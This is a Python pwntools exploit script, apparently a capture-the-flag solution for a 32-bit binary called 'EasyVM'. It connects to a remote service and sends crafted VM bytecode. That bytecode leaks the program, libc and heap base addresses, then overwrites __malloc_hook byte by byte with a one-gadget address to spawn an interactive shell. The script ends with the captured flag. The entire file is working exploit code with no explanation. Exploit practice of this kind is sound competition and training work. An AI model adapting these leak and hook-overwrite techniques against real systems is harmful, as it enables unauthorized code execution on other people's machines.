#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='i386',os='linux',log_level='debug')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./EasyVM')
libc_offset = 0x3c4b20
gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
if debug:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    p = process('./EasyVM')

else:
    libc = ELF('./libc-2.23.so')
    p = remote('121.36.215.224',9999)

def Add(content):
    p.recvuntil('>>>')
    p.sendline('1')
    sleep(0.02)
    p.send(content)

def Start():
    p.recvuntil('>>>')
    p.sendline('2')

def Delete():
    p.recvuntil('>>>')
    p.sendline('3')

def Gift():
    p.recvuntil('>>>')
    p.sendline('4')

def exp():
    #leak proc base
    Gift()
    data = p8(0x9)+p8(0x11)+p8(0x99)
    Add(data)
    Start()
    p.recvuntil("0x")
    code_base = int(p.recvn(8),16) - (0x565556c0-0x56555000)
    log.success("code base => " + hex(code_base))
    #leak libc
    Delete()
    data = p8(0x80)+p8(0x3)+p32(code_base+0x0002fd0)+p8(0x53)+'\x00'
    data += p8(0x80)+p8(0x3)+p32(code_base+0x0002fd1)+p8(0x53)+'\x00'
    data += p8(0x80)+p8(0x3)+p32(code_base+0x0002fd2)+p8(0x53)+'\x00'
    data += p8(0x80)+p8(0x3)+p32(code_base+0x0002fd3)+p8(0x53)+'\x00'
    data += '\x99'
    Add(data)

    Start()
    p.recvn(2)
    libc_base = u32(p.recvn(4)) - libc.sym['puts']
    log.success("libc base => " + hex(libc_base))
    #leak heap
    target = libc_base + (0xf7fb2150-0xf7e00000)
    malloc = libc_base + libc.sym['__malloc_hook']
    shell = libc_base + gadgets[1]

    data = p8(0x80)+p8(0x3)+p32(target)+p8(0x53)+'\x00'
    data += p8(0x80)+p8(0x3)+p32(target+1)+p8(0x53)+'\x00'
    data += p8(0x80)+p8(0x3)+p32(target+2)+p8(0x53)+'\x00'
    data += p8(0x80)+p8(0x3)+p32(target+3)+p8(0x53)+'\x00'
    data += '\x99'
    Add(data)

    Start()
    p.recvn(2)
    heap_base = u32(p.recvn(4))
    log.success("heap base => " + hex(heap_base))
    #get shell
    fake_heap = heap_base + (0x56559aaf-0x56559000)
    fake_heap1 = heap_base + (0x56559abc-0x56559000)
    fake_heap2 = heap_base + (0x56559ac9-0x56559000)
    fake_heap3 = heap_base + (0x56559ad6-0x56559000)
    data = p8(0x80)+p8(0x6)+p32(fake_heap)+p8(0x76)+p32(malloc)+p8(0x54)+'\x00'
    data += p8(0x80)+p8(0x6)+p32(fake_heap1)+p8(0x76)+p32(malloc+1)+p8(0x54)+'\x00'
    data += p8(0x80)+p8(0x6)+p32(fake_heap2)+p8(0x76)+p32(malloc+2)+p8(0x54)+'\x00'
    data += p8(0x80)+p8(0x6)+p32(fake_heap3)+p8(0x76)+p32(malloc+3)+p8(0x54)+'\x00'
    data += '\x99'
    Add(data)

    Start()
    raw_input()
    p.send(p8(shell&0xff))
    raw_input()
    p.send(p8((shell&0xffff)>>8))
    raw_input()
    p.send(p8((shell>>16)&0xff))
    raw_input()
    p.send(p8((shell>>24)))
    #gdb.attach(p,'b* 0x56555000+ 0xcaf')

    p.recvuntil('>>>')
    p.sendline('3')


    p.interactive()

exp()

#flag{a73ujlkj2kohjnlkgmdfgkenzomd}